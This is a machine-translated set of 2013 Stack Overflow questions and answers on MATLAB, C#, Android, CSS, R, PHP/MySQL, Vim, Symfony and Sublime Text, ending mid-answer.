> ID：15845523
> 
> 赞同：0
> 
> 时间：2013-04-06T00:10:31.960
> 
> 标签：matlab, neural-network, backpropagation

我正在使用*newff*进行股票价格预测项目，我正在尝试设置 4 个输入、1 个隐藏层和 1 个输出层 (4-1-1) 的反向传播前馈 ANN。我已经阅读了许多论坛来学习如何为 newff 正确指定这些参数，但是几乎每个论坛/帖子都只是复制/粘贴 matlab *newff*定义（我无法理解，因为我是 matlab 和神经网络的新手）。有人可以让我知道如何使用*newff*设置 4-1-1 ANN吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:14:24.780

例子：

```
input = [0.1 0.8; 0.1 0.75; 0.01 0.8; 0.5 0.6]; 
output = [1 2];
nbHiddenNeurons = 1;
net = newff(input, output, nbHiddenNeurons); 
```

这将为您提供使用 newff 的 4-1-1 ANN。

![在此处输入图像描述](https://i.stack.imgur.com/It9uz.png)

注意： newff() 在 R2010b NNET 7.0 中已过时。现在推荐的功能是前馈网络。

# c# - 忽略csv中一行内的逗号

> ID：15845526
> 
> 赞同：0
> 
> 时间：2013-04-06T00:10:44.860
> 
> 标签：c#, csv, datagridview, datatable, datasource

所以这是我的问题。

我正在将 CSV 读入 datagridview。csv 的第一行是列标题，文件的成为行。我正在读取文件并用作 datagridview 的数据源。但是 CSV 中的某些行具有类似于

> 名称,测试,1,2,3,**测试,2** ,3,2,1,测试,名称

当我使用`.Split()`它时，它在上面加粗的地方认为它是行中的一个新单元格，但是列数是 10 而不是 11，我收到以下错误：

> 输入数组长于此表中的列数

我该如何解决这个问题。

下面是我的 C# 代码。

```
OpenFileDialog openFile = new OpenFileDialog();
        openFile.InitialDirectory = "c:\\";
        openFile.Filter = "txt files (*.txt)|*.txt| CSV Files (*.csv) | *.csv| All Files (*.*) | *.*";
        openFile.FilterIndex = 2;
        openFile.RestoreDirectory = true;
        try {
            if (openFile.ShowDialog() == DialogResult.OK)
            {
                string file = openFile.FileName;
                StreamReader sr = new StreamReader(file);

                /* gets all the lines of the csv */
                string[] str = File.ReadAllLines(file);

                /* creates a data table*/
                DataTable dt = new DataTable();

                /* gets the column headers from the first line*/
                string[] temp = str[0].Split(',');

                /* creates columns of the gridview base on what is stored in the temp array */
                foreach (string t in temp)
                {
                    dt.Columns.Add(t, typeof(string));
                }

                /* retrieves the rows after the first row and adds it to the datatable */
                for (int i = 1; i < str.Length; i++)
                {
                    string[] t = str[i].Split(',');
                    dt.Rows.Add(t);
                }

                /* assigns the data grid view a data source based on what is stored in dt  */
                dataGridView1.DataSource = dt;
            }
        }
        catch (Exception ex) 
        {
                MessageBox.Show("Error: The CSV you selected could not be loaded" + ex.Message);
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T01:01:47.413

这听起来更像是数据问题而不是编程问题。如果您的 CSV 文件应该有 10 列但有些有 11 列，那么您如何知道哪一列是多余的列？

您可以做的一件事是在添加行之前检查列数。

```
for (int i = 1; i < str.Length; i++)
{
    string[] t = str[i].Split(',');
    if(t.Length == temp.Length)
        dt.Rows.Add(t);
} 
```

# android - 当数据集更改时，Android GridView 在稍后索引的插槽中加载 0 索引项

> ID：15845527
> 
> 赞同：3
> 
> 时间：2013-04-06T00:10:46.217
> 
> 标签：android, android-gridview

使用带有扩展 BaseAdapter 的 GridView 我正在加载包含图像和标题的 RelativeLayouts 集合。当用户单击 GridView 中的这些项目之一时，它应该从网格中删除并替换为它后面的项目。

这适用于除第一个项目以外的任何项目（适配器管理的项目的 ArrayList 中的索引 0）。

在我正在测试的设备上，当屏幕完全滚动到网格顶部（3 列和 4 行）并且最后一行被稍微切断时，屏幕能够显示 12 个项目。第 5 行根本没有显示。在这种情况下，如果我单击第一项（将其删除），则所有项都正确填写，但是，第 5 行的第一项（索引 12）返回第一项（索引 0）的视图索引 12 处的项目。

一些有助于解释问题的屏幕：

![第1步](https://i.stack.imgur.com/XryLs.jpg)

点击 Brian McKnight 将删除他，然后 BECK 和其他人将填补。

![第2步](https://i.stack.imgur.com/Vq4d1.jpg)

BECK 已与其余部分一起填写，现在向下滚动到下一行。

![第 3 步](https://i.stack.imgur.com/DQK3b.jpg)

哦哦。贝克也在那儿。我让它部分滚动，所以你可以看到这两个项目都有 BECK 图片。

![第4步](https://i.stack.imgur.com/xshzd.jpg)

向上滚动以使第 12 项（第 5 行）不在视线范围内，然后向下滚动可纠正问题。

网格中任何其他项目的此过程都正常工作，只是项目 0。我做了一些日志记录并发现了一些事情：

*   对象 0 的 getView(...) 方法被调用了很多。当网格第一次加载时，它被调用了 3 次，而所有其他项只被调用一次。
*   当项目 0 以外的项目被删除时，位置 0 的 getView(...) 被调用 19 次。一开始是 3 次，然后在调用了其他对象的所有 getView(...) 方法之后再进行 16 次。
*   当项目 0 被删除时，在您向下滚动到第 5 行（项目 12）之后，将调用 0 的 getView(...) 方法两次。我认为问题出在此处，因为有时如果您可以看到正确的项目在被@位置 0 的项目覆盖之前开始加载。

所以我很确定位置 0 的额外 2 次 getView(...) 调用（在 item @ index 12 出现时调用）是导致此问题的原因。我不知道为什么当时会调用位置 0 的 getView(...) ，以及为什么它会决定覆盖@位置 12 的项目。

我将在下面包含我的适配器的代码，我认为这足以解决问题。

```
public class PopularArtistsGridAdapter extends BaseAdapter {

    private ArrayList<ArtistsListItem> mArtists = new ArrayList<ArtistsListItem>();
    private LayoutInflater mInflater;
    private Context mContext;

    private int mRemovedIndex = -1;
    private int mRefresher = -1;
    private int mLastVisible = -1;

    public PopularArtistsGridAdapter(Context context) {
        mContext = context;
        mInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    }

    public void setItems(ArrayList<ArtistsListItem> artists) {
        if(artists == null)
            throw new NullPointerException();

        mArtists = artists;
        notifyDataSetChanged();
    }

    @Override
    public int getCount() {
        return mArtists.size();
    }

    public void removeItem(int position, int lastVisible) {
        mLastVisible = lastVisible;

        mRemovedIndex = position;
        mRefresher = mRemovedIndex;

        mArtists.remove(position);
        notifyDataSetChanged();
    }

    public void addItem(int position) {
        ArtistsListItem item = getItem(position);

        mArtists.add(0, item);
        notifyDataSetChanged();
    }

    @Override
    public ArtistsListItem getItem(int position) {
        return mArtists.get(position);
    }

    @Override
    public long getItemId(int position) {
        return position;
    }

    private void iterateRefresher() {
        mRefresher++;

        if(mRefresher > mLastVisible) {
            mRemovedIndex = -1;
            mRefresher = -1;
            mLastVisible = -1;
        }
    }

    @Override
    public View getView(final int position, View convertView, ViewGroup parent) {

        final ArtistsListItem item = getItem(position);

        if(convertView == null)
            convertView = mInflater.inflate(R.layout.popular_artist_item, null);

        final TextView tv = (TextView) convertView.findViewById(R.id.pai_stupid_bubble_button);
        final ImageView iv = (ImageView) convertView.findViewById(R.id.pai_image);

        final BitmapDrawable drawable = DrawableManager.fetchBitmapDrawable(mContext, item.getImageURL(), true, false);

        iv.invalidate();
        tv.invalidate();

        if(mRefresher >= 0 && position >= mRefresher) {
            Animation anim = AnimationUtils.loadAnimation(mContext, R.anim.grid_item_fadein);
            anim.setAnimationListener(new AnimationListener() {

                @Override
                public void onAnimationStart(Animation animation) {
                    iv.setImageDrawable(drawable);
                    tv.setText(item.getName());
                }

                @Override
                public void onAnimationRepeat(Animation animation) {
                    // TODO Auto-generated method stub

                }

                @Override
                public void onAnimationEnd(Animation animation) {
                    // TODO Auto-generated method stub

                }
            });

            anim.setStartOffset(300 + (50 * (position - mRemovedIndex)));

            convertView.startAnimation(anim);
            iterateRefresher();
        }
        else {
            iv.setImageDrawable(drawable);
            tv.setText(item.getName());
        }

        return convertView;
    }

} 
```

复习是我为了让屏幕上的所有可见项目在替换已删除项目时淡入淡出而制作的。如果有人在这里看到任何可疑的东西，或者对为什么会发生这种情况有任何其他想法，我将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T05:41:07.807

问题是由于您用于淡化视图的动画。您以至少 350 毫秒的偏移量开始动画。这意味着动画在该时间段过去之前不会运行。问题出现在`onAnimationStart`您的`AnimationListener`. 它正在引用局部变量并对其进行操作。这就是事情出错的地方。

这有点难以解释，所以请尝试跟随。到第一次`onAnimationStart`被调用的时候，`getView`就会被调用很多次。由于项目视图被回收（就是这样`convertView`），因此在调用它时`onAnimationStart`，它所引用的视图可能位于不同的位置。

粗略的插图：

```
// Views being held by the adapter after first pass.
view0 --> onScreenItemtemAtPosition0
view1 --> onScreenItemtemAtPosition1
view2 --> onScreenItemtemAtPosition2

// schedule animation, listener uses view0 reference

// Scrolling occurs, item0 goes offscreen
view0 --> onScreenItemtemAtPosition3 // view0 is now being used in a new position onscreen
view1 --> onScreenItemtemAtPosition1
view2 --> onScreenItemtemAtPosition2

// onAnimationStart triggers and mutates view0
// !!!! Boom !!! view0 is being used for the onscreen item at position 3
// which isn't what you want because the drawable in your case is for item 0 
```

如您所见，这是一个棘手的情况。一种解决方案是让您`AnimationListener`知道您打算变异的视图的位置，以便它可以与即将变异的视图相协调。

大致：

```
class MyAnimationListener extends AnimationListener {
    private int positionToMutate;

    public MyAnimationListener(int positionToMutate) {
        this.positionToMutate = positionToMutate;
    }

    @Override
    public void onAnimationStart(Animation animation) {
        Integer viewPosition = (Integer)localConvertView.getTag(); // add this to getView as final View localConvertView
        if (positionToMutate == viewPosition) {
            iv.setImageDrawable(drawable);
            tv.setText(item.getName());
        }
    }
    // rest of the methods
} 
```

并在您的`getView`方法中使用位置信息更新 convertView 的标签：

```
final View localConvertView = convertView;
localConvertView.setTag(new Integer(position)); 
```

这将确保动画侦听器知道它是否应该改变视图。

# css - Firefox 未将样式应用于“first-child:first-letter”

> ID：15845533
> 
> 赞同：0
> 
> 时间：2013-04-06T00:12:03.177
> 
> 标签：css, firefox, css-selectors

我正在尝试将某种样式应用于我的标题中的第一个字母，它由文本组成。我的网页在这里：[http ://smarterinfive.com](http://smarterinfive.com)

它在 Chrome 中运行良好，但在 FF 中根本不行。以下是我已经尝试将我的样式应用到的属性，但无济于事（在 FF 中）：

```
header[role="banner"] .branding:first-letter {
background: #000;
}

.branding:first-child:first-letter {
background: #000;
 }

.branding h1 a:first-child:first-letter {
background: #000;
} 
```

似乎任何有`first-letter`或`first-child:first-letter`没有工作的东西，但`first-child` **只有**IS 的一切。

我也试过：

1.  `!important`在这些末尾添加。
2.  在开发人员工具中查看它，根本没有显示该属性。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T00:37:59.177

问题`.branding h1 a:first-child:first-letter`在于它`first-letter`只能应用于块元素，而不是像`a`. 请参阅[上一个问题](https://stackoverflow.com/questions/7631722/css-first-letter-not-working)

我也不明白为什么其他人不工作......

但是为什么你甚至需要使用`first-child`？

您可以获得相同的效果并解决此问题：

```
.branding h1:first-letter {
  background: black;
} 
```

它实际上更简单。

[演示](http://jsfiddle.net/AvThr/1/)

# r - 使用 Sys.chmod 在 R 中切换世界可读性

> ID：15845534
> 
> 赞同：1
> 
> 时间：2013-04-06T00:12:09.117
> 
> 标签：r, posix, chmod, cran

如何使用`Sys.chmod`R 中的函数通过“其他”切换可读性，即相当于：

```
chmod o+r myfile
chmod o-r myfile 
```

我特别想不理会模式的其他部分。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:38:48.110

chmod o+r：

```
mod <- file.info('tmp.txt')$mode
Sys.chmod('tmp.txt', mod|4) 
```

chmod 或：

```
mod <- file.info('tmp.txt')$mode
Sys.chmod('tmp.txt', mod&!as.octmode(4)) 
```

# php - 如何在 2 小时内从 mysql 检索计数

> ID：15845536
> 
> 赞同：0
> 
> 时间：2013-04-06T00:12:14.490
> 
> 标签：php, mysql

考虑下表：

```
CREATE TABLE `trans` (
  `transid` varchar(255) NOT NULL,
  `affid` varchar(255) NOT NULL,
  `timestamp` varchar(255) NOT NULL,
  UNIQUE KEY `transid` (`transid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8; 
```

和 PHP 代码：

```
case "today":
    $sale=[];
    for ($i = 0 ; $i < 23 ; $i++) {
        $hours[]= $i;
        $clicks[$i]=$api["clicks"][$i];
    }    
    break; 
```

我想将`$sale`今天每小时的销售计数添加到数组中。类似于：$hours[5] = select count(*) from trans where .. date 在今天的 04:59:59 - 06:00:00 之间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T00:22:36.987

首先，如果您尝试为您的`timestamp`字段使用 unix 时间戳，请立即停止。你已经让你的生活变得痛苦了。使用 MySQL 时间戳字段。老实说，很少有使用 unix 时间戳字段是个好主意的用例。

如果你有一个时间戳字段，你可以做类似的事情

```
SELECT HOUR(`timestamp`) AS `hour`, SUM(`transid`) AS `transaction_count`
FROM trans
WHERE `timestamp` LIKE CONCAT(DATE(NOW()),'%')
GROUP BY `hour`
ORDER BY `hour` ASC 
```

这将为您提供当天每个小时的销售量。确保添加索引以`timestamp`获得最佳查询性能。

如果您没有`timestamp`，那么您需要使用额外的`FROM_UNIXTIME()`转换，这将阻止您使用索引`timestamp`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T00:16:29.743

像这样的东西：

```
<?php
$from=strtotime("".date("Y-m-d")." 04:59:59");
$to=strtotime("".date("Y-m-d")." 06:00:00");
?>

"SELECT * FROM `your_table` 
WHERE `date` > '".$from."' 
AND `date` < '".$to."'" 
```

也许？

如果您`gmdate()`需要当前的 UTC 时间而不是使用`date()`.

# vim - if 语句中的 Vim 智能选项卡

> ID：15845537
> 
> 赞同：1
> 
> 时间：2013-04-06T00:12:17.407
> 
> 标签：vim, indentation

我正在使用 Vim 的[SmartTabs](http://www.vim.org/scripts/script.php?script_id=231)插件将 C 代码与制表符对齐到缩进级别，然后使用空格进行对齐。它适用于诸如

```
void fn(int a,
________int b) {
--->... 
```

制表符是`--->`，空格是`_`。但对于像这样的情况，它似乎不太好用

```
--->if(some_variable >
--->--->some_other_variable) {
--->... 
```

在上面的例子中，Vim 在括号内的第二行插入制表符。有没有办法可以修改 Vim 视为延续线的内容以包含这样的情况，所以我得到：

```
--->if(some_variable >
--->___some_other_variable) {
--->... 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T12:25:08.783

如果有一种缩进样式既可以根据自己的喜好灵活缩进宽度，又可以保持一致的对齐方式，那么您建议的方案就是它。不幸的是，这种风格需要对底层语法有一些基本的了解（例如是否`some_other_variable`是断行条件（→ Spaces）的一部分或条件中的函数调用（→ Tab）），这使得实现起来很困难。

我不知道任何现有的 Vim 插件。`'copyindent'`and选项有点帮助，`'preserveindent'`但本质上你必须自己显式地插入非缩进`Space`（并且可能`:set list`要验证）。

我不知道*其他 Editor*，但大多数其他劣质代码编辑器的情况类似。如果没有良好的自动支持，这种优雅的风格将很难被接受。我很想看到这样的 Vim 插件。

# php - 扩展控制器 - 但如何激活它？(Symfony 2)

> ID：15845539
> 
> 赞同：0
> 
> 时间：2013-04-06T00:12:23.353
> 
> 标签：php, symfony

我想在我的应用程序中使用此代码：

```
class ControllerExtension extends Symfony\Bundle\FrameworkBundle\Controller\Controller 
{
    public function render($view, array $parameters = array(), Response $response = null)
    {

        //etc.

    }

} 
```

但是我应该把它放在哪里以及如何激活它？我猜这与 services.yml 文件有关。我使用过事件监听器，但这显然是不同的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T18:42:40.277

从您的代码片段（[http://justpaste.it/2caz](http://justpaste.it/2caz "代码片段")）来看，您似乎错过了对父级的调用中的“return”关键字。

```
class ControllerExtension extends Symfony\Bundle\FrameworkBundle\Controller\Controller 
{
    public function render($view, array $parameters = array(), Response $response = null)
    {
        if($this->getRequest()->getRequestFormat() == 'json') {
            return new Response(json_encode($parameters));
        } else {
            // Missing 'return' in your snippet
            return parent::render($view, $parameters, $response);
        }
    }

}

class MyController extends ControllerExtension
{
    public function indexAction()
    {
        // This should now work
        return $this->render(...);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T01:03:11.233

你可以把它放在你的包的控制器目录中，即`src/YourNamespace/YourBundleName/Controller/ControllerExtension.php`. 确保在该文件中提供适当的命名空间：

```
namespace YourNamespace\YourBundleName\Controller;
class ControllerExtension extends Symfony\Bundle\FrameworkBundle\Controller\Controller
{
... 
```

要使用它，请在`src/YourNamespace/YourBundlename/Resources/config/routing.yml`

或者

扩展它：

```
namespace YourNamespace\YourBundleName\Controller;
class OtherController extends ControllerExtension
{
... 
```

如果您真正想要做的是覆盖另一个包的控制器，请参阅描述[覆盖控制器](http://symfony.com/doc/current/cookbook/bundles/inheritance.html)的说明书。

*编辑*：

据我所知，没有办法自动使这个控制器以某种方式生效。你可以让你的每个控制器扩展它，就像我上面指出的那样。

如果格式为 json ，您也许可以[创建一个事件侦听](http://symfony.com/doc/current/cookbook/service_container/event_listener.html)器并使用[响应事件](http://api.symfony.com/2.2/Symfony/Component/HttpKernel/KernelEvents.html)以某种方式更改响应。但是，我不确定您将如何从事件侦听器访问视图数据。

# r - R：每月将变量分配给五分位数

> ID：15845540
> 
> 赞同：2
> 
> 时间：2013-04-06T00:12:26.227
> 
> 标签：r, variable-assignment, stocks, quantile, volatility

在这种情况下，我试图在 R 中根据波动性来指示我的数据框每个月的变量值在哪个五分位数中。对于每个月，我都想知道每只股票是否处于波动最大的五分之一，或者是否在其他股票中。

到目前为止，我已经提出了以下功能（见下文）。不幸的是，该功能仅在某些情况下有效，并且经常出现以下错误：

```
Error in cut.default(df$VOLATILITY, unique(breaks), label = FALSE, na.rm =TRUE): 
  invalid number of intervals 
```

您能否就如何改进此代码以使其正常工作给我一些建议。

比较紧急。非常感谢！

```
quintilesVolByMonth <- function(x){
  months<-as.vector(unique(x$DATE))  
  dfx<-data.frame()
  for(n in seq(1,length(months))){
    num<-5
    print(paste("Appending month",months[n],sep=""))
    df<-subset(x,DATE==months[n])
    breaks<-quantile(df$VOLATILITY,probs=seq(0,1, 1/num),na.rm=TRUE)
    df$volquintile <- cut(df$VOLATILITY,unique(breaks), 
                       label=FALSE, na.rm=TRUE)
    dfx<-rbind(dfx,df)
  }
  return(dfx)
}
Frame.Quintile <- quintilesVolByMonth(x) 
```

数据示例：最后一列是我想要得到的。这里的数据只是一个例子，而不是实际结果。

```
> DATE <- c("01/10/2011","01/10/2012","01/10/2010","01/08/2010","01/10/2011","01/12/2011","01/09/2011","01/10/2011","01/09/2012","01/08/2012","01/02/2010","01/01/2011","01/09/2010","01/06/2010","01/07/2010","01/01/2012","01/01/2012","01/11/2011","01/09/2011","01/10/2011")
> NAME<-c("HOEK'S MACHINE DEAD - DELIST.","WORLD SCOPE (CADB TEST STOCK)","BRILL (KON.)",   "BBL DEAD - 30/06/465", "GENK LOGISTICS","GROENIJK.YLCBN. DEAD - DELIST.31/05/479", "NOORD-EUR.HOUTH.","PALTHE DEAD - 4/2/475","GENERALE BANQUE DEAD - DEL. 30/12/490","STORK DEAD - TAKEOVER 905099","LOUVAIN-LA-NEUVE","VENTOS DEAD - 06/06/384","BRAINE-LE-COMTE SUSP 14/02/460","VILENZO DEAD - 25/11/370","ECONOSTO KON. DEAD - 07/07/374","ELECTRORAIL DEAD - DELIST 21/02/387","BLYSTEIN FL.1384","OBOURG (CIMENTS)","BRUGEFI DEAD - 31/07/475","GIB NEW")
> VOLATILITY<-c(0.3383, 0.084,  0.046,  0.0945, 0.0465, 0.2008, 0.1361, 0.2183, 0.1032, 0.1083, 0.0494, 0.0538, 0.0357, 0.037,  0.0386, 0.073,  0.073,  0.0393, 0.0687, 0.3308)
> VOLQUINTILE<-c(4,1,1,2,2,3,2,3,4,2,3,2,4,1,2,1,1,2,3,4)
>   
> x<-data.frame(DATE,NAME,VOLATILITY, VOLQUINTILE)
> x
         DATE                                    NAME VOLATILITY VOLQUINTILE
1  01/10/2011           HOEK'S MACHINE DEAD - DELIST.     0.3383           4
2  01/10/2012           WORLD SCOPE (CADB TEST STOCK)     0.0840           1
3  01/10/2010                            BRILL (KON.)     0.0460           1
4  01/08/2010                    BBL DEAD - 30/06/465     0.0945           2
5  01/10/2011                          GENK LOGISTICS     0.0465           2
6  01/12/2011 GROENIJK.YLCBN. DEAD - DELIST.31/05/479     0.2008           3
7  01/09/2011                        NOORD-EUR.HOUTH.     0.1361           2
8  01/10/2011                   PALTHE DEAD - 4/2/475     0.2183           3
9  01/09/2012   GENERALE BANQUE DEAD - DEL. 30/12/490     0.1032           4
10 01/08/2012            STORK DEAD - TAKEOVER 905099     0.1083           2
11 01/02/2010                        LOUVAIN-LA-NEUVE     0.0494           3
12 01/01/2011                 VENTOS DEAD - 06/06/384     0.0538           2
13 01/09/2010          BRAINE-LE-COMTE SUSP 14/02/460     0.0357           4
14 01/06/2010                VILENZO DEAD - 25/11/370     0.0370           1
15 01/07/2010          ECONOSTO KON. DEAD - 07/07/374     0.0386           2
16 01/01/2012     ELECTRORAIL DEAD - DELIST 21/02/387     0.0730           1
17 01/01/2012                        BLYSTEIN FL.1384     0.0730           1
18 01/11/2011                        OBOURG (CIMENTS)     0.0393           2
19 01/09/2011                BRUGEFI DEAD - 31/07/475     0.0687           3
20 01/10/2011                                 GIB NEW     0.3308           4 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:31:08.730

这对你有用吗？

```
library(plyr)
vol1<-ddply(mydata,.(DATE), transform, max.name=NAME[which.max(quantile(VOLATILITY))])
             DATE                                    NAME VOLATILITY                                max.name
    1  01/01/2011                 VENTOS DEAD - 06/06/384     0.0538                 VENTOS DEAD - 06/06/384
    2  01/01/2012     ELECTRORAIL DEAD - DELIST 21/02/387     0.0730     ELECTRORAIL DEAD - DELIST 21/02/387
    3  01/01/2012                        BLYSTEIN FL.1384     0.0730     ELECTRORAIL DEAD - DELIST 21/02/387
    4  01/02/2010                        LOUVAIN-LA-NEUVE     0.0494                        LOUVAIN-LA-NEUVE
    5  01/06/2010                VILENZO DEAD - 25/11/370     0.0370                VILENZO DEAD - 25/11/370
    6  01/07/2010          ECONOSTO KON. DEAD - 07/07/374     0.0386          ECONOSTO KON. DEAD - 07/07/374
    7  01/08/2010                    BBL DEAD - 30/06/465     0.0945                    BBL DEAD - 30/06/465
    8  01/08/2012            STORK DEAD - TAKEOVER 905099     0.1083            STORK DEAD - TAKEOVER 905099
    9  01/09/2010          BRAINE-LE-COMTE SUSP 14/02/460     0.0357          BRAINE-LE-COMTE SUSP 14/02/460
    10 01/09/2011                        NOORD-EUR.HOUTH.     0.1361                                    <NA>
    11 01/09/2011                BRUGEFI DEAD - 31/07/475     0.0687                                    <NA>
    12 01/09/2012   GENERALE BANQUE DEAD - DEL. 30/12/490     0.1032   GENERALE BANQUE DEAD - DEL. 30/12/490
    13 01/10/2010                            BRILL (KON.)     0.0460                            BRILL (KON.)
    14 01/10/2011           HOEK'S MACHINE DEAD - DELIST.     0.3383                                    <NA>
    15 01/10/2011                          GENK LOGISTICS     0.0465                                    <NA>
    16 01/10/2011                   PALTHE DEAD - 4/2/475     0.2183                                    <NA>
    17 01/10/2011                                 GIB NEW     0.3308                                    <NA>
    18 01/10/2012           WORLD SCOPE (CADB TEST STOCK)     0.0840           WORLD SCOPE (CADB TEST STOCK)
    19 01/11/2011                        OBOURG (CIMENTS)     0.0393                        OBOURG (CIMENTS)
    20 01/12/2011 GROENIJK.YLCBN. DEAD - DELIST.31/05/479     0.2008 GROENIJK.YLCBN. DEAD - DELIST.31/05/479 
```

更新的解决方案：

```
library(plyr)    

   vol2<-ddply(x,.(DATE), transform,quantile=ifelse(VOLATILITY<quantile(VOLATILITY,p=0.25),1,
ifelse(((VOLATILITY>quantile(VOLATILITY,p=0.25))& (VOLATILITY<quantile(VOLATILITY,p=0.5))),2,ifelse(((VOLATILITY>quantile(VOLATILITY,p=0.5))& VOLATILITY<quantile(VOLATILITY,p=0.75)),3,4))))

       DATE                                    NAME VOLATILITY   quantile
1  01/01/2011                 VENTOS DEAD - 06/06/384     0.0538        4
2  01/01/2012     ELECTRORAIL DEAD - DELIST 21/02/387     0.0730        4
3  01/01/2012                        BLYSTEIN FL.1384     0.0730        4
4  01/02/2010                        LOUVAIN-LA-NEUVE     0.0494        4
5  01/06/2010                VILENZO DEAD - 25/11/370     0.0370        4
6  01/07/2010          ECONOSTO KON. DEAD - 07/07/374     0.0386        4
7  01/08/2010                    BBL DEAD - 30/06/465     0.0945        4
8  01/08/2012            STORK DEAD - TAKEOVER 905099     0.1083        4
9  01/09/2010          BRAINE-LE-COMTE SUSP 14/02/460     0.0357        4
10 01/09/2011                        NOORD-EUR.HOUTH.     0.1361        4
11 01/09/2011                BRUGEFI DEAD - 31/07/475     0.0687        1
12 01/09/2012   GENERALE BANQUE DEAD - DEL. 30/12/490     0.1032        4
13 01/10/2010                            BRILL (KON.)     0.0460        4
14 01/10/2011           HOEK'S MACHINE DEAD - DELIST.     0.3383        4
15 01/10/2011                          GENK LOGISTICS     0.0465        1
16 01/10/2011                   PALTHE DEAD - 4/2/475     0.2183        2
17 01/10/2011                                 GIB NEW     0.3308        3
18 01/10/2012           WORLD SCOPE (CADB TEST STOCK)     0.0840        4
19 01/11/2011                        OBOURG (CIMENTS)     0.0393        4
20 01/12/2011 GROENIJK.YLCBN. DEAD - DELIST.31/05/479     0.2008        4 
```

# clojure - Sublime Text 和 Clojure：不要将单引号配对

> ID：15845543
> 
> 赞同：15
> 
> 时间：2013-04-06T00:12:30.023
> 
> 标签：clojure, lisp, sublimetext2, quotes, sublimetext

有没有办法获得语法类型来定义键盘快捷键，或者设置键盘快捷键以取决于语法类型（可能在`"context"`）设置？

我的引用列表`'(1 2 3)`是这样输入的：`'(1 2 3)'`因为 Sublime 应用了这种有用的（但在这种情况下不是）行为。

这是`Default (OSX).sublime-keymap`文件的相关位

```
// Auto-pair single quotes
{ "keys": ["'"], "command": "insert_snippet", "args": {"contents": "'$0'"}, "context":
    [
        { "key": "setting.auto_match_enabled", "operator": "equal", "operand": true },
        { "key": "selection_empty", "operator": "equal", "operand": true, "match_all": true },
        { "key": "following_text", "operator": "regex_contains", "operand": "^(?:\t| |\\)|]|\\}|>|$)", "match_all": true },
        { "key": "preceding_text", "operator": "not_regex_contains", "operand": "['a-zA-Z0-9_]$", "match_all": true },
        { "key": "eol_selector", "operator": "not_equal", "operand": "string.quoted.single", "match_all": true }
    ]
},
{ "keys": ["'"], "command": "insert_snippet", "args": {"contents": "'${0:$SELECTION}'"}, "context":
    [
        { "key": "setting.auto_match_enabled", "operator": "equal", "operand": true },
        { "key": "selection_empty", "operator": "equal", "operand": false, "match_all": true }
    ]
},
{ "keys": ["'"], "command": "move", "args": {"by": "characters", "forward": true}, "context":
    [
        { "key": "setting.auto_match_enabled", "operator": "equal", "operand": true },
        { "key": "selection_empty", "operator": "equal", "operand": true, "match_all": true },
        { "key": "following_text", "operator": "regex_contains", "operand": "^'", "match_all": true }
    ]
}, 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-05-08T22:51:19.513

我做了这个简单的事情：
把**这个**：

```
// Singlequote for lisp
{ "keys": ["'"], "command": "insert_snippet", "args": {"contents": "'"}, "context":
    [
        { "key": "selector", "operator": "equal", "operand": "source.lisp"}
    ]
}, 
```

在您的**用户键绑定**中。

* * *

**提升一个档次：**

在这种情况下还有一个不寻常的情况：（ `'|'`管道代表插入符号），按退格键后，它仍然会删除两个单引号。

* * *

要解决此问题，请将**其**添加到您的**user-key-keybindings**：

```
{ "keys": ["backspace"], "command": "left_delete", "context":
    [
        { "key": "setting.auto_match_enabled", "operator": "equal", "operand": true },
        { "key": "selection_empty", "operator": "equal", "operand": true, "match_all": true },
        { "key": "preceding_text", "operator": "regex_contains", "operand": "'$", "match_all": true },
        { "key": "following_text", "operator": "regex_contains", "operand": "^'", "match_all": true },
        { "key": "selector", "operator": "equal", "operand": "source.lisp"}
    ]
}, 
```

* * *

**重要的提示：**

正如pickwick在评论中所说，你当然应该改变

`"source.lisp"`
to
`"source.<lisp-of-your-choice>"`
or rather to
`"source.<name-of-syntax-of-your-choice>"`
or even-er:
`"source.<name-of-scope-the-syntax-you're-using-is-using>"`.

* * *

***ScopeAlways***是一个插件，可以向您显示您的语法使用*的正确范围名称。*很可能会像`"source.lisp"`CL，`"source.clojure"`clojure，也许`"source.scheme"`如果你和酷孩子一起出去玩，等等......

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-04-06T04:04:28.093

你应该可以，虽然有点痛苦。首先，您必须禁用内置的自动配对（别担心，当我们完成后，其他一切的自动配对应该可以工作）。为此，请在您的用户设置中设置以下内容。

```
"auto_match_enabled": false 
```

然后将以下内容添加到您的设置中。

```
"my_auto_match_enabled": false 
```

接下来，我们需要添加一组新的键绑定。我只从你发布的内容中做了一个，但我会解释我做了什么，因为它可能并不明显。

```
{ "keys": ["'"], "command": "insert_snippet", "args": {"contents": "'${0:$SELECTION}'"}, "context":
    [
        { "key": "setting.my_auto_match_enabled", "operator": "equal", "operand": true },
        { "key": "selection_empty", "operator": "equal", "operand": false, "match_all": true },
        { "key": "selector", "operator": "not_equal", "operand": "source.clojure", "match_all": true }
    ]
} 
```

首先，请注意我将第一个上下文键从 切换`setting.auto_match_enabled`到`setting.my_auto_match_enabled`。接下来，我添加了最后一个将限制范围的上下文条目。有了这个，片段只会在你不在`source.clojure`范围内时运行。您可能需要修改它，因为我不知道 clojure 中的作用域名称是什么，我只是猜到了 =)。您必须对所有单引号条目执行此操作。现在，因为我们禁用了内置的自动配对，我们也必须读取所有这些条目。在这些条目中，我们将再次更改`setting.auto_match_enabled`为`setting.my_auto_match_enabled`。在那之后，一切都应该工作。请注意，它实际上不一定是`my_auto_match_enabled`，这正是我选择的。您可以根据需要更改它。

话虽如此，我并没有完全测试所有这些，所以如果您遇到问题，请发表评论。

**解释：**

